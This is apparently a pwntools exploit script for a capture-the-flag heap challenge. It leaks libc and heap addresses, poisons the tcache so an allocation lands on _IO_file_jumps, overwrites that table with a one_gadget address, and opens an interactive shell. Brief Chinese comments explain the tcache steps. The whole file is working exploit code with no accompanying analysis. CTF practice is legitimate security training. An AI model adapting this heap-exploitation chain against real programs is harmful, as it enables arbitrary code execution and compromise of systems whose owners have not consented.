from os import wait

from pwn import *

context.log_level = 'info'

io = process("./pwn")
#io = remote("node4.anna.nssctf.cn", 28473)
libc = ELF("./libc.so.6")
elf = ELF("./pwn")


def add():
    io.recvuntil(b"Choice:")
    io.sendline(b"1")


def delete(idx: int):
    io.recvuntil(b"Choice:")
    io.sendline(b"2")
    io.recvuntil(b"Idx: ")
    io.sendline(str(idx).encode())


def show(idx: int):
    io.recvuntil(b"Choice:")
    io.sendline(b"3")
    io.recvuntil(b"Idx: ")
    io.sendline(str(idx).encode())


def edit(idx: int, size:int,content: bytes):
    io.recvuntil(b"Choice:")
    io.sendline(b"4")
    io.recvuntil(b"Idx: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Size: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"Content: ")
    io.sendline(content)


for i in range(9):
    add()  # 0~8

for i in range(8):
    delete(i)  # 0~7

show(7)  # unsorted bin leak libc
main_arena = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 96
print("main arena=", hex(main_arena))
libc_base = main_arena - libc.sym["main_arena"]
print("libc base address =", hex(libc_base))
iOFileJumps = libc_base + libc.sym["_IO_file_jumps"]
oneGadget = libc_base + 0xDA864


show(0)  # tcache[0] leak heap base
heap_base = u64(io.recvuntil(b"\x05")[-5:].ljust(8, b"\x00"))
print("heap base address =", hex(heap_base))

for i in range(5): # 消耗 tcache 中的 6 ~ 2 还剩下 0, 1
    add()  # 8~13


edit(1, 0x100, p64(heap_base ^ iOFileJumps))  # 把 chunk0 从 tcache 数组剥离，现在 0 没有用了。chunk1 之后指向 _io_file_jumps
add()  # 14 取出 chunk1
add()  # 15 取出 _io_file_jumps，往 heaplist 写 _io_file_jumps 地址
edit(15, 0x100, p64(0) * 3 + p64(oneGadget))

io.interactive()
